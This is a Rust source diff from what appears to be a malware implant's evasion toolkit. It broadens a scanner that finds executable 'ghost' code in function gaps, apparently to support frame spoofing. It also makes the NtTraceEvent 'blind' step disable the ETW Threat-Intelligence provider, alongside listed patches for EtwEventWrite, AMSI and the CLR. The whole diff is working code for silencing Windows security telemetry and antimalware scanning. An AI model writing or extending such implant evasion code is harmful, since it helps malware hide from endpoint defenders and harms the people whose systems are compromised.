@@ -93,12 +93,13 @@ impl PdataGapScanner for LivePdataScanner {
                     if off >= img.len() {
                         return false;
                     }
-                    // `C3` = ret, `C2 xx xx` = ret imm16 (leaf return). A gap
-                    // whose first byte is a return is classic ghost territory.
-                    img[off] == 0xC3
+                    // Ghost = executable code at a gap (no .pdata). Strongest
+                    // signal: a leaf return (C3 ret / C2 imm16 ret / E8 rel32
+                    // call thunk). Treat C3/C2/E8 as ghost candidates.
+                    matches!(img[off], 0xC3 | 0xC2 | 0xE8)
                 },
                 // nop_pred: alignment / padding fills (`90` nop, `CC` int3, or
-                // a run of zero bytes) between functions.
+                // a run of zero bytes) between functions, plus multi-byte NOPs.
                 |_rva, image| -> bool {
                     let img = match image {
                         Some(b) => b,
@@ -110,6 +111,7 @@ impl PdataGapScanner for LivePdataScanner {
                     }
                     let b = img[off];
                     b == 0x90 || b == 0xCC || b == 0x00
+                        || (b == 0x66 && off + 1 < img.len() && img[off + 1] == 0x90)
                 },
             );
             // Promote RVAs to absolute addresses so downstream kits (frame
@@ -157,7 +159,18 @@ impl BlindKit for LiveBlind {
         // original page protection after the write window.
         let r = unsafe {
             match target {
-                BlindTarget::NtTraceEvent => crate::blind::patch_nt_trace_event(),
+                BlindTarget::NtTraceEvent => {
+                    let r = crate::blind::patch_nt_trace_event();
+                    // Belt-and-suspenders: also disable the ETW-TI provider's
+                    // EnableInfo via NtTraceControl. Best-effort — if it fails,
+                    // the byte-patch is still in place.
+                    let _ = unsafe {
+                        crate::blind::disable_etw_provider(
+                            &nyx_implant_evasionsdk::__private::ETW_TI_GUID,
+                        )
+                    };
+                    r
+                }
                 BlindTarget::EtwEventWrite => crate::blind::patch_etw(),
                 BlindTarget::Amsi => crate::blind::patch_amsi(),
                 BlindTarget::Clr => {
